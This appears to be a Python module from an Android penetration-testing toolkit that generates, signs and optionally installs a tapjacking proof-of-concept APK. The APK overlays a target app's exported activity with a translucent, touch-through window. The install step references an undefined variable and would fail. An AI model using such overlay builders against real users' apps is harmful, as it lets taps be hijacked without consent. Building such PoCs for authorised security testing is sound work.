#!/usr/bin/env python3
"""
Tapjacking APK Builder
"""

import os
import subprocess
import shutil
from colorama import Fore, Style
import redroid.config as config
from redroid.modules.target.target_app import set_target_app
from redroid.modules.exploits.apk_utils import sign_apk
from redroid.core.adb import run_adb_command

def tapjacking_apk_builder():
    """
    Fully automated APK generation for TapJacking PoC (Linux compatible).
    Prompts for target app details and builds an unsigned APK.
    """
    # global config.target_app

    # Check if target app is set, if not prompt to set it
    if not config.target_app:
        print(Fore.YELLOW + "‚ö†Ô∏è No target app set. Please select a target app first." + Style.RESET_ALL)
        set_target_app()
        if not config.target_app:
            print(Fore.RED + "‚ùå No target app selected. Aborting APK build." + Style.RESET_ALL)
            return

    package_name = config.target_app
    print(Fore.GREEN + f"Using target app: {package_name}" + Style.RESET_ALL)

    # Prompt for activity name
    activity_name = input("Enter the exported activity name to test: ")

    # Validate inputs
    if not activity_name:
        print("Error: Activity name cannot be empty.")
        return

    print(f"\n{Fore.CYAN}Building tapjacking APK targeting:{Style.RESET_ALL}")
    print(f"- Package: {package_name}")
    print(f"- Activity: {activity_name}")
    print("-" * 40)

    # Helper function
    def ensure_directory_exists(path):
        """Create directory if it doesn't exist"""
        if not os.path.exists(path):
            os.makedirs(path)

    # Setup paths
    base_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(base_dir, "Tapjacking-ExportedActivity")

    # Find Android SDK - Linux paths
    sdk_path = None
    possible_sdk_paths = [
        os.path.join(os.path.expanduser("~"), "Android", "Sdk"),
        os.environ.get('ANDROID_SDK_ROOT'),
        os.environ.get('ANDROID_HOME'),
        "/opt/android-sdk",
        "/usr/lib/android-sdk"
    ]

    for path in possible_sdk_paths:
        if path and os.path.exists(path):
            sdk_path = path
            break

    if not sdk_path:
        print(Fore.RED + "Error: Android SDK not found." + Style.RESET_ALL)
        print(Fore.YELLOW + "Please set ANDROID_SDK_ROOT or ANDROID_HOME environment variable." + Style.RESET_ALL)
        return

    # Find build tools
    build_tools_path = os.path.join(sdk_path, 'build-tools')
    if not os.path.exists(build_tools_path):
        print(Fore.RED + "Error: Android build tools not found." + Style.RESET_ALL)
        print(Fore.YELLOW + "Please install build tools using Android Studio SDK Manager." + Style.RESET_ALL)
        return

    # Get latest build tools version
    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
    if not versions:
        print(Fore.RED + "Error: No build tools versions found." + Style.RESET_ALL)
        print(Fore.YELLOW + "Please install build tools using Android Studio SDK Manager." + Style.RESET_ALL)
        return

    latest_version = sorted(versions)[-1]
    tools_path = os.path.join(build_tools_path, latest_version)
    print(Fore.GREEN + f"‚úÖ Using build tools version: {latest_version}" + Style.RESET_ALL)

    # Setup project structure
    print(Fore.CYAN + "Setting up project..." + Style.RESET_ALL)
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)

    # Create project directories
    src_dir = os.path.join(project_dir, "src")
    java_dir = os.path.join(src_dir, "com", "tapjacking", "demo")
    res_dir = os.path.join(project_dir, "res")

    ensure_directory_exists(java_dir)
    ensure_directory_exists(os.path.join(res_dir, "layout"))
    ensure_directory_exists(os.path.join(res_dir, "values"))

    # Write Android Manifest
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.tapjacking.demo">
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <application
        android:allowBackup="true"
        android:label="TapjackingDemo">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".OverlayService"
            android:enabled="true"
            android:exported="false" />
    </application>
</manifest>'''

    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest)

    # Write layout file
    layout = '''<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#80000000">
    <Button
        android:id="@+id/sampleButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="Tapjacking Running" />
</RelativeLayout>'''

    with open(os.path.join(res_dir, "layout", "overlay_layout.xml"), 'w') as f:
        f.write(layout)

    # Write strings.xml
    strings = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">TapjackingDemo</string>
</resources>'''

    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write(strings)

    # Write MainActivity.java
    main_activity = f'''
package com.tapjacking.demo;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        checkOverlayPermission();
    }}

    private void checkOverlayPermission() {{
        if (!Settings.canDrawOverlays(this)) {{
            Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())
            );
            startActivityForResult(intent, 1);
        }} else {{
            startService(new Intent(this, OverlayService.class));
            finish();
        }}
    }}

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {{
            if (Settings.canDrawOverlays(this)) {{
                startService(new Intent(this, OverlayService.class));
                finish();
            }} else {{
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
            }}
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity)

    # Write OverlayService.java
    overlay_service = f'''
package com.tapjacking.demo;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.os.Build;

@SuppressLint("ClickableViewAccessibility")
public class OverlayService extends Service {{
    private WindowManager windowManager;
    private View overlayView;

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    @Override
    public void onCreate() {{
        super.onCreate();

        Intent externalIntent = new Intent();
        externalIntent.setClassName("{package_name}", "{activity_name}");
        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(externalIntent);

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
            @Override
            public void run() {{
                setupTapjackingView();
            }}
        }}, 1000);
    }}

    @SuppressLint("RtlHardcoded")
    private void setupTapjackingView() {{
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);

        int overlayType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }} else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        }} else {{
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        }}

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.LEFT;
        windowManager.addView(overlayView, params);

        Button btn = overlayView.findViewById(R.id.sampleButton);
        btn.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                stopSelf();
            }}
        }});
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (windowManager != null && overlayView != null) {{
            windowManager.removeView(overlayView);
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "OverlayService.java"), 'w') as f:
        f.write(overlay_service)

    # Find Java - prefer system Java, fallback to Android Studio's
    java_home = os.environ.get('JAVA_HOME')
    if not java_home or not os.path.exists(java_home):
        # Try to find Android Studio's JDK on Linux
        possible_jdk_paths = [
            "/opt/android-studio/jbr",
            os.path.join(os.path.expanduser("~"), "android-studio", "jbr"),
            "/usr/lib/jvm/default-java",
            "/usr/lib/jvm/java-11-openjdk-amd64",
            "/usr/lib/jvm/java-17-openjdk-amd64"
        ]

        for path in possible_jdk_paths:
            if os.path.exists(path):
                java_home = path
                break

    if not java_home or not os.path.exists(java_home):
        # Try using system javac
        javac_path = shutil.which('javac')
        if javac_path:
            java_home = os.path.dirname(os.path.dirname(javac_path))
        else:
            print(Fore.RED + "Error: Java JDK not found." + Style.RESET_ALL)
            print(Fore.YELLOW + "Please install JDK or set JAVA_HOME environment variable." + Style.RESET_ALL)
            return

    print(Fore.GREEN + f"‚úÖ Using Java from: {java_home}" + Style.RESET_ALL)

    # Build APK using Android build tools
    print(Fore.CYAN + "Building APK..." + Style.RESET_ALL)

    # Find android.jar
    android_jar = None
    platforms_dir = os.path.join(sdk_path, "platforms")
    if os.path.exists(platforms_dir):
        platforms = sorted([d for d in os.listdir(platforms_dir) if d.startswith("android-")], reverse=True)
        if platforms:
            android_jar = os.path.join(platforms_dir, platforms[0], "android.jar")

    if not android_jar or not os.path.exists(android_jar):
        print(Fore.RED + "Error: android.jar not found." + Style.RESET_ALL)
        print(Fore.YELLOW + "Please install Android platforms using SDK Manager." + Style.RESET_ALL)
        return

    print(Fore.GREEN + f"‚úÖ Using android.jar from: {android_jar}" + Style.RESET_ALL)

    # 1. Compile resources
    print(Fore.CYAN + "üì¶ Compiling resources..." + Style.RESET_ALL)
    aapt = os.path.join(tools_path, "aapt")
    if not os.path.exists(aapt):
        print(Fore.RED + "Error: aapt not found." + Style.RESET_ALL)
        return

    try:
        subprocess.run([aapt, "package", "-f", "-m",
                       "-J", src_dir,
                       "-M", os.path.join(project_dir, "AndroidManifest.xml"),
                       "-S", res_dir,
                       "-I", android_jar],
                      check=True, capture_output=True, text=True)
        print(Fore.GREEN + "‚úÖ Resources compiled successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error compiling resources: {e.stderr}" + Style.RESET_ALL)
        return

    # 2. Compile Java files
    print(Fore.CYAN + "‚òï Compiling Java files..." + Style.RESET_ALL)
    javac = os.path.join(java_home, "bin", "javac")
    if not os.path.exists(javac):
        javac = shutil.which('javac')
        if not javac:
            print(Fore.RED + "Error: javac not found." + Style.RESET_ALL)
            return

    # Create classes directory
    classes_dir = os.path.join(project_dir, "classes")
    ensure_directory_exists(classes_dir)

    java_files = [
        os.path.join(java_dir, "MainActivity.java"),
        os.path.join(java_dir, "OverlayService.java"),
        os.path.join(src_dir, "com", "tapjacking", "demo", "R.java")
    ]

    try:
        subprocess.run([javac,
                       "-source", "1.8",
                       "-target", "1.8",
                       "-bootclasspath", android_jar,
                       "-d", classes_dir] + java_files,
                      check=True, capture_output=True, text=True)
        print(Fore.GREEN + "‚úÖ Java files compiled successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error compiling Java files: {e.stderr}" + Style.RESET_ALL)
        return

    # 3. Create JAR file
    print(Fore.CYAN + "üìö Creating JAR file..." + Style.RESET_ALL)
    jar = os.path.join(java_home, "bin", "jar")
    if not os.path.exists(jar):
        jar = shutil.which('jar')
        if not jar:
            print(Fore.RED + "Error: jar not found." + Style.RESET_ALL)
            return

    classes_jar = os.path.join(project_dir, "classes.jar")

    # Change to classes directory to create jar with correct structure
    current_dir = os.getcwd()
    os.chdir(classes_dir)
    try:
        subprocess.run([jar, "cf", classes_jar, "com"],
                      check=True, capture_output=True, text=True)
        print(Fore.GREEN + "‚úÖ JAR file created successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error creating JAR: {e.stderr}" + Style.RESET_ALL)
        os.chdir(current_dir)
        return
    finally:
        os.chdir(current_dir)

    # 4. Convert JAR to DEX
    print(Fore.CYAN + "üîÑ Converting to DEX format..." + Style.RESET_ALL)
    d8 = os.path.join(tools_path, "d8")
    if not os.path.exists(d8):
        print(Fore.RED + "Error: d8 not found." + Style.RESET_ALL)
        return

    # Create output directory
    dex_output_dir = os.path.join(project_dir, "dex-output")
    ensure_directory_exists(dex_output_dir)

    try:
        subprocess.run([d8,
                       "--lib", android_jar,
                       "--output", dex_output_dir,
                       classes_jar],
                      check=True, capture_output=True, text=True)
        print(Fore.GREEN + "‚úÖ DEX conversion successful." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error converting to DEX: {e.stderr}" + Style.RESET_ALL)
        return

    # Move the classes.dex file
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"),
                os.path.join(project_dir, "classes.dex"))

    # 5. Build APK using Android Build Tools
    print(Fore.CYAN + "üì± Packaging APK..." + Style.RESET_ALL)
    output_apk = os.path.join(base_dir, "tapjacking.apk")

    try:
        subprocess.run([aapt, "package", "-f", "-M",
                       os.path.join(project_dir, "AndroidManifest.xml"),
                       "-S", res_dir,
                       "-I", android_jar,
                       "--min-sdk-version", "24",
                       "--target-sdk-version", "28",
                       "-F", output_apk],
                      check=True, capture_output=True, text=True)
        print(Fore.GREEN + "‚úÖ APK packaged successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error packaging APK: {e.stderr}" + Style.RESET_ALL)
        return

    # Copy DEX file to current directory for easier adding
    temp_dex = os.path.join(base_dir, "classes.dex")
    shutil.copy2(os.path.join(project_dir, "classes.dex"), temp_dex)

    # Add the DEX file
    try:
        subprocess.run([aapt, "add", output_apk, "classes.dex"],
                      check=True, capture_output=True, text=True, cwd=base_dir)
        print(Fore.GREEN + "‚úÖ DEX file added to APK." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error adding DEX to APK: {e.stderr}" + Style.RESET_ALL)
        return
    finally:
        # Clean up
        if os.path.exists(temp_dex):
            os.remove(temp_dex)

    # APK is unsigned at this point
    print(Fore.GREEN + "‚úÖ APK generation complete (unsigned)." + Style.RESET_ALL)
    print(f"\n{Fore.CYAN}Build successful! APK generated at: {output_apk}{Style.RESET_ALL}")

    # Ask user if they want to sign the APK
    signed_apk = sign_apk(output_apk)
    if signed_apk and signed_apk != output_apk:
        print(f"\n{Fore.GREEN}‚úÖ Final signed APK: {signed_apk}{Style.RESET_ALL}")

        # Ask if user wants to install
        install_choice = input(Fore.CYAN + "\nDo you want to install the APK on the connected device? (y/n): " + Style.RESET_ALL).strip().lower()
        if install_choice in ['y', 'yes']:
            if config.config.device_serial and adb_command:
                install_result = run_adb_command(f'install -r "{signed_apk}"')
                if install_result and install_result.returncode == 0:
                    print(Fore.GREEN + "‚úÖ APK installed successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "‚ùå APK installation failed." + Style.RESET_ALL)
            else:
                print(Fore.RED + "‚ùå No device connected." + Style.RESET_ALL)

        return signed_apk
    else:
        return output_apk


